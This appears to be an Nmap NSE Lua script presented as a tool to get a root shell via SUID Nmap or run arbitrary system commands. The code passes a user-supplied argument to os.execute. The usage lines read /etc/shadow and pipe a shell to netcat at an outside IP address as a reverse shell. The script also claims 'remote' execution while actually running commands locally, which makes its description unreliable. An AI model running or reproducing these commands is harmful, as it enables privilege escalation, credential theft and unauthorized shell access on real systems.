---
-- Nmap NSE suid-shell.nse - Version 1.2
-- Copy nse to: /usr/share/nmap/scripts/file-checker.nse
-- Update db  : sudo nmap --script-updatedb
-- executing  : nmap --script-help file-checker.nse
---


-- SCRIPT BANNER DESCRIPTION --
description = [[

Author: Maky, r00t-3xp10it
NSE script to get root shell on SUID Nmap OR simple executing a remote system command.

Some Syntax examples:
nmap --script-help suid-shell.nse
nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=cat /etc/shadow" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>

]]

---
-- @usage
-- nmap --script-help suid-shell.nse
-- nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=cat /etc/shadow" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | suid-shell:
-- |   module author: r00t-3xp10it
-- |     sys command: executed sucessefully ..
-- |_
-- @args user.command   -> The command to be executed -> Default: /bin/bash
-- @args fakeUser.agent -> The User-agent to send in header request -> Default: iPhone,safari
---

author = "Maky, r00t-3xp10it"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "safe"}



-- DEPENDENCIES (lua nse libraries) --
local os = require "os"
local http = require "http"
local stdnse = require ('stdnse')
local shortport = require "shortport"


  -- THE RULE SECTION --
  portrule = shortport.http
  local command = stdnse.get_script_args(SCRIPT_NAME..".command") or "/bin/bash"


-- THE ACTION SECTION --
action = function(host, port)
local options = {header={}}   --> manipulate 'header' request ..
options['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_4 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B350 Safari/8536.25" --> use iPhone,safari User-agent OR your own...
options['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
options['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)
  -- execute system command (args)
  os.execute(""..command.."")
  return "\n  module author: r00t-3xp10it\n    sys command: executed sucessefully ..\n"
end
